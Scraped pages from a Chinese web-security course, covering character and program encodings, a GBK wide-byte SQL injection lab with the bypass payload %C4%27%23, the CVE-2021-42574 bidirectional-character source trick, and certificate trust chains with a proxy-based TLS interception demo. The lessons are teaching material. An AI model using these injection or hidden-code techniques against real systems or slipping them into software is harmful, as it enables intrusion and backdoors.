<p>这个实例其实很有意义，除了本身涉及到的加密知识以外，我们更需要知道的是如何针对一个黑盒系统进行漏洞挖掘，这里要记住两条漏洞挖掘黄金法则：一方面，你需要熟悉目标系统的开发与设计过程，深刻理解特定功能的最佳实践，从而<strong>判断漏洞是否存在</strong>；另外，你要足够了解目标系统的执行逻辑，有目的性地缩小测试范围，以此来<strong>降低攻击向量空间</strong></p>

<p>加密失败风险的出现有很多原因，大部分与我们不合理地使用加密工具有关。那么我们该如何防御呢？</p>

<p>这里我们推荐一些相对抽象的安全建议，供你在工作中参考，具体一些需要详细讨论的部分，我们会在后面几节课程中陆续展开。</p>

<p>首先<strong>在数据层面</strong>，我们需要对数据进行分类分级，识别出需要重点保护的数据类型，并且不要存储不使用的敏感数据，不被存储的数据是不可能丢失的。</p>

<p><strong>在存储层面</strong>，要关闭可能包含敏感数据的缓存功能，还要确保所有的敏感数据在静态存储中都以加密形态存放。</p>

<p><strong>在传输层面</strong>，我们要确保所有数据传输协议都启用了安全功能，比如TLS，并且不要使用传统的不安全协议进行敏感数据传输，如FTP、SMTP等。</p>

<p><strong>在算法层面</strong>，我们需要使用标准的加密算法，并且保证算法的及时更新，合理地管理密钥，尤其不要使用已经被验证安全性不足的算法，如MD5、SHA1、PKCS 1 v1.5等。</p>

<p>更进一步地，<strong>在随机化层面</strong>，密钥需要使用密码学算法随机生成，如果要使用一个口令密码，也是要通过口令密码生成函数来产生最终的密钥。除了密钥相关的数据，还要确保密码算法中涉及参数的随机化生成，确保其无法被预测。</p>

<h2 id="思考题">思考题</h2>

<p>这节课程中我们所编写的低加密指数攻击代码，仍然有进一步优化的空间，你可以提高这段攻击代码的执行效率吗？</p>

<p>欢迎在评论区留下你的思考，我们下节课再见。</p>
</div>
                        </div><div class="book-post">
                            
                            <div align="center"><a target="_blank" href="https://www.aliyun.com/minisite/goods?userCode=lc4iupk4">阿里云2C2G3M 99元/年，老用户 也可以哦</a><hr></div>
                            
                            <p id="tip" align="center"></p>
                            <h1 id="title" data-id="07 弱编码：程序之间的沟通语言安全吗？" class="title">07 弱编码：程序之间的沟通语言安全吗？</h1>
                            <div><p>你好，我是王昊天。</p>

<p>进入了加密失败这个大篇章，我们的第一个话题就是——弱编码。</p>

<p>如果你想了解什么是编码，那么不妨想象一下双十一购物的场景吧。</p>

<p>我们通过电商平台购买了许多零食、家居用品以及二次元手办，一时下单一时爽，一直下单一直爽，于是全国人民都在买买买。这个时候电商平台的难题来了，各式各样的商品要如何送到每个人手里呢？总不能每一种商品打造一条运输线路。</p>

<p>于是快递出现了，通过对不同类型的商品进行方形硬纸盒的封装，既保护了商品在运输中的完整性，又保证了传输的便捷性。</p>

<p>这就是编码的典型场景，在服务端与客户端传输数据的过程中，我们无法确认传输的内容中是否包含传输协议不支持的内容，因此在数据传输之前我们希望通过编码的方式将传输数据进行规范化。</p>

<p>这里一定要注意，编码是不具备保密性的。就像快递小哥只是不想知道包装里面是什么东西，如果他想知道的话，应该是一件不难的事情。</p>

<h2 id="编码">编码</h2>

<p>我们来看看维基百科是如何定义编码的：</p>

<blockquote>
<p>编码是信息从一种形式或格式转换为另一种形式的过程；解码则是编码的逆过程。</p>
</blockquote>

<p>作为一名优雅的开发工程师，或者是一名“大黑客”，掌握多种编码特征都是非常重要的，这一讲，我就来带你进入编码的世界遨游一番。</p>

<h4 id="字符编码">字符编码</h4>

<p>字符编码是把字符集中的字符映射为指定集合中的某一个对象，以便文本在计算机中存储或者在网络之间传递。在计算机发展的早期，ASCII这样的字符集是字符编码的标准形式，但是这些字符集有着很大的局限性，比如只适用于英文场景等，于是人们开发了许多方法来扩展它们，编码的类型也逐步丰富：</p>

<ul>
<li>早期标准：ASCII、EBCDIC</li>
<li>西欧标准：ISO-8859-1、ISO-8859-5、ISO-8859-6、ISO-8859-7、ISO-8859-11、ISO-8859-15等</li>
<li>DOS字符集：CP437、CP737、CP850等</li>
<li>Windows字符集：Windows-1250、Windows-1251、Windows-1252等</li>
<li>中文：GB2312、GBK等</li>
<li>Unicode：Unicode、UTF-7、UTF-8、UTF-16、UTF-32等</li>
</ul>

<p>这些字符集有各自的诞生意义和应用场景，在我们日常工作中会经常遇到其中的某一些，这里我们选取几个有代表性的字符集来深入研究。</p>

<p><strong>ASCII</strong>-
ASCII（American Standard Code for Information Interchange，美国信息交换标准代码）是最常用的编码，来表示字母、数字以及常用符号。如果你正在使用Mac或者Linux类型系统，可以直接使用如下命令来查看所有的ASCII字符：</p>

<pre><code class="language-plain">&gt; man ascii
ASCII(7)             BSD Miscellaneous Information Manual             ASCII(7)

NAME
     ascii -- octal, hexadecimal and decimal ASCII character sets

DESCRIPTION
     The octal set:

     000 nul  001 soh  002 stx  003 etx  004 eot  005 enq  006 ack  007 bel
     010 bs   011 ht   012 nl   013 vt   014 np   015 cr   016 so   017 si
     020 dle  021 dc1  022 dc2  023 dc3  024 dc4  025 nak  026 syn  027 etb
     030 can  031 em   032 sub  033 esc  034 fs   035 gs   036 rs   037 us
     040 sp   041  !   042  "   043  #   044  $   045  %   046  &amp;   047  '
     050  (   051  )   052  *   053  +   054  ,   055  -   056  .   057  /
     060  0   061  1   062  2   063  3   064  4   065  5   066  6   067  7
...
</code></pre>

<p>ASCII的一个字符占8位（bit），第一位总是0，这种情况下能够支持2的7次方也就是128个字符，其中00100000~01111110之间都是可打印字符。</p>

<p><strong>GB 2312 &amp; GBK</strong>-
对于中文来说，汉字博大精深，区区128个字符肯定是不能够满足我们的需求的，于是就诞生了中文编码。考虑到8位编码是远远不够的，并且需要与ASCII编码兼容，GB2312编码方法应运而生，它具有以下特征：</p>

<ol>
<li>使用两个8位来进行编码；</li>
<li>0～127编号的字符使用ASCII标准编码；</li>
<li>两个大于127的字符连在一起时表示一个汉字，前一个称为高字节，后一个称为低字节。</li>
</ol>

<p>我们通常所说的全角字符就是双字节字符，而单字节字符就是半角字符。但后来发现GB2312的编码仍然不具备表示所有汉字的能力，于是我们就对上述第3个条件进行了优化，诞生了GBK编码，这里K表示“扩展”。优化后第三点特征表示为：</p>

<ol>
<li>允许低字节使用0~127的字符，仅凭借高字节判断是否为中文。</li>
</ol>

<p>GB2312编码示例：</p>

<pre><code class="language-plain">你好hello123
\xC4\xE3\xBA\xC3\x68\x65\x6C\x6C\x6F\x31\x32\x33
</code></pre>

<p>常见的GBK编码：</p>

<pre><code class="language-plain">你好hello123
\xC4\xE3\xBA\xC3\x68\x65\x6C\x6C\x6F\x31\x32\x33
</code></pre>

<p><strong>Unicode &amp; UTF-8</strong>-
对于全球各国的文字来说，ASCII的字符集已经不能满足使用了，对于这个问题ISO提出了一个囊括全球所有文字的终极解决方案：Unicode。它最初规定所有的字符都是用两个字节来表示，这个版本就是UTF-16；但是后面发现仍然不够使用，于是扩展到四个字节，这个版本就是UTF-32。目前最新的Unicode已经支持了emoji表情，让我们的文字语言更加丰富且生动。</p>

<p>但是所有的字符都使用Unicode来存储是否会增大存储成本呢？毕竟ASCII单字符只占用1个字节，GBK也仅仅只占用2个字节，如果全部使用UTF-32来表示，就意味着至少2倍存储空间的膨胀，这时另一个新的编码算法的出现解决了这个问题，并成为了在coding过程中广泛使用的编码类型——UTF-8。</p>

<p>UTF-8是一种变长编码，比如对于ASCII码它就用1个字节表示，面对其他类型的编码就在前面加一个高位字节。通过这种方式，它在普遍英文coding但是携带中文注释的环境中就显得非常适合了。</p>

<p>Unicode编码示例：</p>

<pre><code class="language-plain">你好hello123
\x00004F60\x0000597D\x00000068\x00000065\x0000006C\x0000006C\x0000006F\x00000031\x00000032\x00000033
</code></pre>

<p>TF-8编码示例：</p>

<pre><code class="language-plain">你好hello123
\xE4BDA0\xE5A5BD\x68\x65\x6C\x6C\x6F\x31\x32\x33
</code></pre>

<h4 id="程序编码">程序编码</h4>

<p><strong>URL 编码</strong>-
URL编码又称百分号编码，因为它的编码特征是以%开头，是不是很形象？它主要用于统一资源定位符（URL）的编码，也适用于统一资源标识符（URI）的编码。URI所允许的字符主要分为保留字符和未保留字符两类：保留字符主要是那些具有特殊含义的字符，如<code>! * &amp;</code>等；未保留字符，主要指不具备特殊含义的字符，如<code>A B C</code>等。</p>

<p>如果一个保留字符在上下文中是有意义的，并且需要在URI中按照内容格式进行展示，那么该字符就要使用百分号编码。百分号编码首先会把字符的ASCII值表示为两个16进制的数字，然后在其前面放置转义字符<code>%</code>；对于非ASCII字符则先转换为UTF-8字节序，然后再放置转义字符<code>%</code>。</p>

<p>UTF-8格式百分号编码示例：</p>

<pre><code class="language-plain">你好hello123
%E4%BD%A0%E5%A5%BDhello123
</code></pre>

<p><strong>Base64 编码</strong>-
Base64是一种用64个字符来表示二进制数据的方法。由于 64 = 2 ^ 6，因此每6位可映射到一个可打印字符，又由于每6位等于四分之三字节，因此可以简单理解为每四分之三字节映射到一个新的字节，这样也就很容易能计算出base64的编码膨胀率。Base64通常用于表示、传输以及存储二进制数据。</p>

<p>简单思考一下Base64的规则，会发现一个有趣的事情：如果要编码的字节数不能被3整除，那么就会无法进行Base64编码。所以完整的Base64编码规则是先使用“0”将不足的字节数在末尾补足，使其能够被3整除，然后再进行Base64的编码。增加的字节数在末尾用等同数量的“=”进行标记。</p>

<p>base64编码示例：</p>

<pre><code class="language-plain">你好hello123
5L2g5aW9aGVsbG8xMjM=
</code></pre>

<h4 id="编码-v-s-加密">编码 v.s. 加密</h4>

<p>通过对编码的一些讨论，我们已经了解到编码的一些特性，这里我们将编码与我们上节课学过的加密做一下简单的对比，看看它们有什么相同和不同。</p>

<ul>
<li><p>编码与加密都是可逆运算-
通过对编码数据进行解码即可恢复原始数据；对加密数据解密我们同样可以获得原始数据。</p></li>

<li><p>编码只需要1个输入，而加密需要2个输入-
选定编码函数之后，我们只需要选择待编码数据即可；而对于加密函数，除了待加密数据以外，我们还需要选择加密密钥。</p></li>

<li><p>编码的目的是方便数据交互，加密的目的是保护数据交互-
通过编码可以将数据在不同协议系统之间进行流转，目的在于可用性；通过加密可以将数据安全地传输，目的在于机密性。</p></li>
</ul>

<h4 id="编码-v-s-转义">编码 v.s. 转义</h4>

<p>通常，转义是很容易与编码混淆的概念。因为与加密相比，转义同时具备只需要一个输入，可逆运算两个条件。但是转义与编码的使用场景是不同的，即它们的“目的”不同。</p>

<p>与编码便于数据交互的目的不同，转义通常有两个目的：</p>

<ol>
<li>编码一个语句上的实体，比如设备命令或者无法被打印字符直接表示的特殊数据；</li>
<li>作为特殊字符引用，主要用于表示无法在当前上下文中以可打印形态录入的字符，比如回车符。</li>
</ol>

<p>转义字符开头的字符序列被叫做转义序列，通常一个转义字符并没有它自己的意思，因此转义序列一般具有2个或更多字符。</p>

<p>通过判断二者的目的，我们可以很容易对编码和转义进行区分。</p>

<h2 id="案例实战">案例实战</h2>

<p>了解了编码的基础知识，接下来我们一起来研究几个与编码相关的安全问题。这几个实战案例都已经搭建在<a href="https://mituan.zone/#/" target="_blank">MiTuan</a>，搜索【编码漏洞合集】就可以直接使用。</p>

<h4 id="宽字节注入">宽字节注入</h4>

<p>启动靶机之后，我们可以直接看到一个支持HTTP GET请求的页面，页面上告诉了我们这个示例漏洞内部的代码逻辑：程序内部通过addslashes函数，对用户GET请求中的str参数进行处理，然后拼接到SQL语句中，同时页面上也将打印实际执行的SQL语句，方便我们对漏洞利用过程进行调试。</p>

<p><img src="assets/0eabbe993c5a4d3a929664c625daf02c.jpg" alt="图片"></p>

<p>那么接下来我们就开始尝试利用这个潜在的SQL注入漏洞。</p>

<p>第一步是寻找注入点。由于这个页面仅支持str这一个参数的输入，因此我们可以判断注入点应该就在这里。我们可以先尝试一些常规的注入方式来看一下页面的处理结果。比如，通过尝试<code>1</code> 和<code>1'</code>这两种不同的输入，我们发现经过addslashes函数的处理，SQL语句并没有被闭合，这种情况下我们是不能执行注入的。</p>

<p>虽然<code>1'</code>这个参数并没有达到让SQL语句闭合的目标，但是这一次SQL语句的构造可以给我们一些新的启发：</p>

<pre><code class="language-sql hljs"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span><span class="hljs-operator">=</span><span class="hljs-string">'1\''
</span></code></pre>

<p>通过这个完整的SQL语句，我们可以发现 <code>1</code> 与 <code>\</code> 是连续字符，这种情况下如果将 <code>1</code> 修改为特殊字符，使其能够通过编码组合与 <code>\</code> 组成新的字符，我们就能实现编码绕过。</p>

<p>第二步就是实践我们的想法，找出一个能与 <code>\</code> 组成新的字符的特殊字符。</p>

<p>通过编码工具，可以得知 <code>\</code> 的GBK编码是 <code>\x5C</code> ，经过刚刚的学习我们知道了GBK编码中汉字编码的特征，所以我们只需要选取一个合适的高位字节即可。比如，这里我选择了 <code>\xC4</code> ，通过编码工具我们可以知道 <code>\xC4\x5C</code> 是汉字 <code>腬</code> ，因此拼接完成之后的完整内容 <code>\xC4\x5C\x26\x23\x33\x39\x3B</code> 即可满足要求。</p>

<p>通过这些操作，我们将 <code>1</code> 替换为 <code>%C4</code> 即可实现第一步中我们的编码绕过设想。</p>

<p>第三步很简单，将 <code>%C4</code> 作为参数输入GET请求即可。要注意GET请求中的str参数需要应用URL编码格式，而想要得到GB2312的URL编码，只需在前面增加“%”符号即可。因此将 <code>%C4</code> 与 <code>'</code> 一起拼接，得到的完整参数是 <code>%C4%27</code> 。</p>

<p>将我们构造的完整参数输入浏览器地址栏进行访问，可以得到页面的输出：</p>

<pre><code class="language-sql hljs"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span><span class="hljs-operator">=</span><span class="hljs-string">'腬''
</span></code></pre>

<p>接下来可以进一步增加其他SQL控制字符进行注入动作：</p>

<pre><code class="language-sql hljs">str<span class="hljs-operator">=</span><span class="hljs-operator">%</span>C4<span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-operator">%</span><span class="hljs-number">23</span>
<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span><span class="hljs-operator">=</span><span class="hljs-string">'腬'</span>#<span class="hljs-string">'
</span></code></pre>

<h4 id="cve-2021-42574">CVE-2021-42574</h4>

<p>这是一个由剑桥大学的研究人员发现的漏洞，它由编码问题引起，常见于供应链污染类型漏洞。在介绍漏洞原理之前我们先来和它进行一个亲密接触：</p>

<pre><code class="language-plain">#include &lt;stdio.h&gt;
#include &lt;stdbool.h&gt;

int main() {
    bool isAdmin = false;
    /* begin admins only */ if (isAdmin) {
        printf("You are an admin.\n");
    /* end admins only */ }
    return 0;
}
</code></pre>

<p>上述C代码逻辑十分简单，核心逻辑是判定isAdmin的bool类型并执行相应动作。按照isAdmin的初始化数值，函数应该直接进入return逻辑，不产生任何输出。这里我们直接运行：</p>

<pre><code class="language-bash hljs">$&gt; clang program.c &amp;&amp; ./a.out
You are an admin.
</code></pre>

<p>神奇的事情出现了，尽管isAdmin的值为False，程序仍然执行了if判断分支内部的函数。</p>

<p>聪明的你知道这是为什么吗？</p>

<p>其实奥秘就在“控制字符”上。通过使用Unicode控制字符，我们可以将编码的顺序进行视觉效果上的反转。比如上面的示例代码，其真实代码如下：</p>

<pre><code class="language-plain">#include &lt;stdio.h&gt;
#include &lt;stdbool.h&gt;

int main() {
    bool isAdmin = false;
    /*RLO } LRIif (isAdmin)PDI LRI begin admins only */
        printf("You are an admin.\n");
    /* end admins only RLO { LRI*/
    return 0;
}
</code></pre>

<p>可以看到在真实的代码中，if 语句完全被注释符号包裹，根本不存在真实判断逻辑。</p>

<p>那么为什么Unicode要设置这么恶意的“欺骗性”字符呢？</p>

<p>其实并非Unicode有恶意，这里我们回顾一下Unicode诞生的原因——囊括全球文字的终极编码方案。人类社会的文化是非常丰富的，以语言文字为例，既有像汉字这样按照从左到右顺序读写的文字，也有像阿拉伯语这样从右到左读写的文字，因此为了满足这种文字应用场景，Unicode提供了影响阅读顺序的控制字符。</p>

<p>由于近些年供应链污染攻击盛行，一旦黑客入侵软件厂商代码库或者污染了具有广泛应用的开源项目，就会造成巨大的安全威胁。</p>

<h2 id="总结">总结</h2>

<p>这节课我们学习了加密失败的另一种安全风险形式——弱编码。</p>

<p>事实上关于编码的安全问题很多，主要是由于对编码和加密的算法理解有误所致，弱编码仅仅是一个浅层问题的缩影。通过了解编码的本质——信息格式的转换，就可以区分开编码与加密，进而就可以选择合适的使用场景。</p>

<p>从弱编码这一浅层安全问题入手，这节课我们进一步解读了一些主流的编码标准，让我们可以快速识别数据所属的编码类别：像ASCII占位1个字节，共8bit，能够描述128个字符，适用于英文场景；GB2312与GBK占位2个字节，共16bit，用于中文场景，GBK是GB2312的扩展；Unicode与UTF-8则更为宏大，用于描述全球各国的文字，并且UTF-8具有变长的特征。</p>

<p>在了解了字符编码的基础上，我们进一步探讨了常见的程序编码：像URL编码，其特征是以%开头，因此又称百分号编码，其编码结果与GBK和UTF-8的原始编码是非常相似的；而Base64编码，其特征是编码结果均为可打印字符，并且编码结果末尾可能存在=符号，主要适用场景是二进制数据的传递；再进一步扩展的话，其他Base编码也有相似之处。</p>

<p>与编码相关的更多深层次安全问题，是与编码转换以及转义字符处理相关的，因此在实战案例部分我选择了2个漏洞带你深入探究编码安全问题：</p>

<ol>
<li>宽字节注入问题，其发生的根源在于数据与命令的结合，但直接导火索是字符处理函数考虑不全，对于编码转换场景未经过严密的处理，产生了编码绕过的后果；</li>
<li>Unicode字符序列问题，以CVE-2021-42574为例，其发生的根源是IDE在渲染Unicode编码过程中进行了控制字符解析，造成了开发人员理解代码错误引入后门或其他安全威胁。</li>
</ol>

<p>通过这节课的学习，我们可以发现编码看似是非程序开发问题，但是涉及的知识和原理非常广泛，同时引入的安全问题由于其逻辑晦涩也不易被发现。因此在coding过程中，深刻理解编码的作用以及程序内部执行过程的编码逻辑十分重要，考虑到编码引入的安全问题相对隐蔽，我们也可以考虑在项目中引入优秀的SAST工具，协助我们发现和定位编码层的安全问题。</p>

<h2 id="思考题">思考题</h2>

<p>除了这一讲中我们提到了两种编码漏洞，还有一种同形字符编码漏洞，CVE-ID是CVE-2021-42694，你可以自己完成漏洞追踪及分析吗？</p>

<p>欢迎在评论区留下你的思考，我们下节课再见。</p>
</div>
                        </div><div class="book-post">
                            
                            <div align="center">因收到Google相关通知，网站将会择期关闭。<a target="_blank" href="https://lumendatabase.org/notices/44265620">相关通知内容</a><hr></div>
                            
                            <p id="tip" align="center"></p>
                            <h1 id="title" data-id="08 数字证书：攻击者可以伪造证书吗？" class="title">08 数字证书：攻击者可以伪造证书吗？</h1>
                            <div><p>你好，我是王昊天。</p>

<p>我们都知道，www.baidu.com之所以能够访问Baidu，是因为DNS在解析www.baidu.com这个记录的时候将IP地址指向了Baidu的服务器集群，通过DNS协议我们可以找到正确的服务器地址。</p>

<p>很多时候，我们在连接网络的时候没有手动设置DNS服务器地址，这时我们采用的就是网关统一的默认DNS服务器。如果网关的DNS被黑客入侵，并且黑客将www.baidu.com指向了自己构建的恶意网站，用户就会访问错误的站点，同时可能遭遇黑客的进一步控制。</p>

<p>那么问题来了，<strong>我们该如何判断正在访问的站点的真实性呢</strong>？</p>

<p>答案就是互联网证书体系，而证书体系的有效性就依赖于信任链，这就是这节课我们要一起研究的内容。</p>

<h2 id="证书">证书</h2>

<p>我们平时在网络上常说的证书全称叫数字证书，<strong>它是一种基于公钥认证体系的电子文件，用于证明公钥持有者的身份</strong>。</p>

<p>一般在证书中会包含以下几类信息：</p>

<ul>
<li>公钥信息</li>
<li>拥有者身份信息</li>
<li>数字证书认证机构对该文件的数字签名</li>
</ul>

<p>证书持有者通过该文件（证书），即可向系统或者其他用户证明身份，从而获得对方信任并授权使用某些敏感服务。</p>

<p>这里我们使用Mac系统，通过 launchpad -&gt; 其他 -&gt; 钥匙串访问 -&gt; 系统根证书，可以查看目前系统内部预置的根证书。</p>

<p><img src="assets/0196bec5b94a4dbebb5ae6bae6e7276e.jpg" alt="图片"></p>

<p>简单来说，认证机构用自己的私钥对需要认证的人或组织的公钥施加数字签名并生成证书，即证书的本质就是<strong>对公钥施加数字签名</strong>。</p>

<h4 id="ca-证书颁发机构">CA 证书颁发机构</h4>

<p>CA（Certificate Authority）是证书的签发机构，它是公钥基础设施的核心，负责签发证书、认证证书、管理证书。</p>

<p><strong>作为互联网信息服务商，它是如何获得证书的呢？</strong></p>

<p>首先，服务商要先向CA提出申请，这一流程往往是线下的商务流程，主要任务是确认现实生活中各种资料；接下来，CA会确认服务商的身份，若通过审核则为服务商颁发公钥，并将公钥信息与用户身份信息绑定；最后，CA为绑定身份的公钥信息进行签名，签名结果即是证书，返还给申请者。根据这个证书颁发流程，我们可以发现CA也是拥有证书申请者的公钥以及私钥的。</p>

<p>CA通过证书赋予了服务商信任，那么网上的公众用户又该如何信任CA以及获得证书的服务商呢？答案是签名验证。对于CA，用户可以通过验证CA的签名来证明它的合法性（签名的验证过程实际上是使用公钥对私钥加密的数据段进行解密的过程）；而对于服务商，用户则可以选择使用CA的公钥对服务商证书进行签名验证，一旦验证通过，即证明了证书的有效性。</p>

<h4 id="根证书">根证书</h4>

<p>自古以来，有一个千古难题 —— 鸡生蛋，蛋生鸡，那么先有鸡还是先有蛋呢？</p>

<p>不知道你有没有发现，我们刚刚似乎遗漏了什么至关重要的东西——用户是如何验证CA签名的呢？为了解决这个问题，这里我们要引入一个新的概念——根证书（root certificate）。</p>

<p>在密码学和计算机安全领域，根证书是属于“根证书颁发机构”的公钥证书，在公钥基础设施体系中，<strong>它是信任链的起点，是一切安全信任的基石</strong>，通常来自公认可靠的政府机关、证书颁发机构以及非营利性组织。根证书在互联网领域获得广泛认可，通常被预先安装在操作系统、浏览器等软件中。</p>

<p>在时效性上，由于根证书的颁发和部署流程都非常复杂耗时，需要包括行政人员及机构法人身份的核准，所以一张根证书有效期可以长达20年以上。</p>

<p>一些大企业会自己研发及部署很多内部应用，他们会在内部电脑安装企业自签的根证书，以支持内部网络的企业级软件，但是由于这些证书未被广泛认可，因此只在企业内部应用环境可用。</p>

<h2 id="信任链">信任链</h2>

<p>想要了解什么是信任链，我们还要从根证书的签发说起。</p>

<p>由于终端直接面向用户的服务商数量巨大，根证书签发的效率又比较低，如果只有数量有限的根证书机构签发证书，将会严重影响证书授权数量。为了解决这一问题，中间商的身份被引入进来。<strong>中间商只要持有根证书机构签发的中介证书，就有权给服务商授权证书。</strong>这里服务商获得的证书叫终端实体证书。</p>

<p><img src="assets/12dda8f006f04d82a3280912a19748a5.jpg" alt="图片"></p>

<p>当互联网用户访问一个网站时，浏览器会执行认证路径验证算法，使用网站所提供的电子证书去对应系统预安装的根证书，通过验证两者是否匹配来判断从根证书到终端节点的路径是否为一条有效的信任链。如下图所示，整个信任链的结构是一个以根证书为顶层的树状结构。</p>

<p><img src="assets/ee362d20b2a54e41ad8bcbd67ee62523.jpg" alt="图片"></p>

<h4 id="证书信任链的不正确回溯">证书信任链的不正确回溯</h4>

<p>在coding过程中，当我们需要对证书进行验证时，可能会直接调用证书验证函数来获取验证结果，但是却没有对证书信任链进行有效地回溯，这就可能导致错误的信任关系的产生。</p>

<p>简单来说，从证书验证过程获取的信任是从信任链中继承下来的，而信任链的终点是一个可信的机构实体。在通常的工作场景中，这条信任链会经过多个实体，这些实体会为信任链中的下一个实体做担保，信任链的起点就是终端用户访问的目标。</p>

<p><img src="assets/895787dd4e19485ba68e12138181b732.jpg" alt="图片"></p>

<p>在用户获取了访问目标证书的情况下，如果想要建立信任关系，只检查第一层信任链是不够的，你需要对完整的信任链进行检查。</p>

<p>举例来说，以下这些场景都会导致信任链断裂：</p>

<ul>
<li>信任链中任意一个非根节点的证书是自签发的（self-signed）；</li>
<li>没有完成整个信任链中每个节点的检查；</li>
<li>信任链中的某个节点证书缺失一些基础信息或者额外的重要扩展信息；</li>
<li>信任链中上层节点证书失效或者被攻击者窃取。</li>
</ul>

<p>示例代码：</p>

<pre><code class="language-plain">...
cert = ssl_get_peer_certificate(ssl);
if( cert &amp;&amp; host )
    foo = ssl_get_verify_result(ssl);

if( X509_V_OK == foo || X509_V_ERR_SELF_SIGNED_CERT_IN_CHAIN == foo)
    return 0;
...
</code></pre>

<p>这是从网络上copy-paste的一段代码，你可以找到上述代码有什么安全隐患吗？</p>

<p>这段代码的安全隐患，主要是由于对证书验证过程理解不深刻导致的。代码作者直接使用了网络上的代码片段而没有仔细检查逻辑，使得这段代码允许了自签名证书的使用，因此并未构建有效地信任链，这就可能引发DNS污染或者中间人攻击等安全风险。</p>

<h2 id="案例实战">案例实战</h2>

<h4 id="let-s-encrypt">Let’s Encrypt</h4>

<p>如果我们有一个正在运营的Web应用，应该如何为这个Web应用配置一个SSL证书呢？</p>

<p>这里我们来通过<a href="https://mituan.zone/" target="_blank">M</a><a href="https://mituan.zone/" target="_blank">iTuan</a>了解一下业内的SSL证书生态及使用方法。</p>

<p>首先，通过浏览器访问<a href="https://mituan.zone/#/account/login" target="_blank">MiTuan</a>主页，可以发现浏览器栏左侧有一个小锁的标志，这个锁的标志意味着该用户与该站点的通信受到保护，通信数据对于第三方是不可见的。</p>

<p>接下来，点击小锁并进入安全页，可以看到目前的证书是有效的：</p>

<p><img src="assets/3606d71b3cac428a804ffedb56ca5e89.jpg" alt="图片"></p>

<p>再接下来通过选择证书有效这个选项，我们可以打开证书信息：</p>

<p><img src="assets/c9273ad4b94046c3a3817f34f0e7ac2b.jpg" alt="图片"></p>

<p>可以看到mituan.zone的证书由Let’s Encrypt签发；它的上级信任链节点是R3证书，R3证书所处的节点是一个中级证书颁发机构，R3证书由ISRG根证书签发；ISRG根证书属于Internet Security Research Group，该机构是一个根证书颁发机构。</p>

<p>关于Let’s Encrypt，它是一个非营利性的数字证书认证机构，旨在以自动化流程代替手动创建和安装证书，可以为网站提供免费的传输层安全协议（TLS）证书。Let’s Encrypt由ISRG（互联网安全研究小组）提供服务支撑。</p>

<p>从mituan.zone的访问来看，Let’s Encrypt的证书是有效的，那么为什么Let’s Encrypt签发的证书能够被识别为安全呢？</p>

<p><img src="assets/f13108d2a4254eabb019e8581ddc0151.jpg" alt="图片"></p>

<p>在技术实现上，Let’s Encrypt有一个由IdenTrust签名的根证书，该根证书在签署了两个子证书后离线储存，两个子证书分别用于签发请求和本地备份。而IdenTrust的CA根证书已经被广泛地预置在大部分浏览器中，因此Let’s Encrypt签发的证书可以直接被识别，用户甚至不需要在本地存放ISRG的根证书。</p>

<h4 id="中间人攻击-mitm">中间人攻击（MITM）</h4>

<p>无论是开发中调试，还是安全项目中的模拟渗透，我们都会遇见一些场景需要调试Web应用的网络交互过程，这种调试工作一般是通过Proxy工具来完成的，在一般情况下Proxy工具都可以很好地完成任务，但是当TLS证书存在的情况下，事情会出现一些新的变化。</p>

<p>仍然以mituan.zone为例，此时我们希望在本地proxy工具中调试登录过程，让我们来试试看：</p>

<p><img src="assets/9aad64cf10ec452a8068d1d2e0af6417.jpg" alt="图片"></p>

<p>我使用的是Mac OS上面的Charles（Web Debugging Proxy）应用，可以看到打开Charles并启动代理流量捕获后，我们并没有成功获取到mituan.zone的通信内容，得到的是一个失败的说明——由于证书问题导致客户端SSL握手失败。</p>

<p>这是一个非常有意思的地方，上面失败说明中的客户端就是我们访问mituan.zone的浏览器。要知道，浏览器可是在我们自己手里，要不要信任对方还不是我们说了算？你说它可信，它就可信！但问题是，浏览器说的不可信指的是谁呢？</p>

<p>想要知道浏览器所指的certificate_unknown(46)错误究竟指谁，就要了解Charles的技术实现原理。实际上，Charles会自己启动一个Porxy，然后将Browser的访问流量导向Proxy，最后再从Proxy中将流量发到目标站点，通过这样的方式实现对于通信内容的捕获。</p>

<p>了解了实现原理，答案就很清晰了：<strong>浏览器所说的证书不可信，指的就是Charles的证书。</strong></p>

<p>那我们接下来只需要将Charles的证书加载到系统内并设置信任即可：</p>

<p><img src="assets/719619811b994a329f54cf393c8e3596.jpg" alt="图片"></p>

<p>完成Charles的证书信任设置后，我们再次尝试捕获通信内容：</p>

<p><img src="assets/c63796b9d0e746e7987bf8891ec8f1b1.jpg" alt="图片"></p>

<p><img src="assets/8fcf38a9f7524f4d9a6eb2a47223bcd6.jpg" alt="图片"></p>

<p>可以看到我们已经能够对TLS加密的HTTP请求进行内容分析了，这一过程在安全领域我们就称为——中间人攻击。</p>

<h2 id="总结">总结</h2>

<p>这节课我们学习了如何使用加密知识构建互联网安全信任体系。</p>

<p>在互联网出现的早期，有一句流传很广的话——“在互联网上，没人知道你是一条狗”。这句话的背后意味着互联网身份的不可信，这种特性或许在匿名社交上有很大优势，但是在互联网商业服务领域却不可接受。来自互联网的终端用户需要一种方式，使他们能够确定访问的目标主体是真正的服务商，而不是骗子伪造的站点。</p>

<p>为了构建互联网信任体系，数字证书应运而生。它是一种基于公钥认证体系的电子文件，包含服务商的身份信息、公钥信息以及数字签名。这一体系的核心是证书颁发机构，也就是我们常说的CA。如果说CA是流程层面的核心，那么根证书则是技术层面的核心，通过信任链的层层传导，才能够完成整个互联网信任体系的搭建。</p>

<p>在本节课的实战案例部分，我们首先一起体验了TLS证书的检查以及申请过程，这些知识可以帮助你快速构建起安全的Web应用；接下来以Web调试需求为场景，我们又一起探索了Web调试工具的技术原理，以及MITM（Man-In-The-Middle Attack，中间人攻击）的实现思路。</p>

<p>相信通过本节课程的学习，你可以对证书以及信任链有一个清晰、整体的理解。这些知识不仅在构建安全的Web应用领域会对你产生帮助，更会在加密体系加持的多种新兴技术领域让你快速成长。</p>

<h2 id="思考题">思考题</h2>

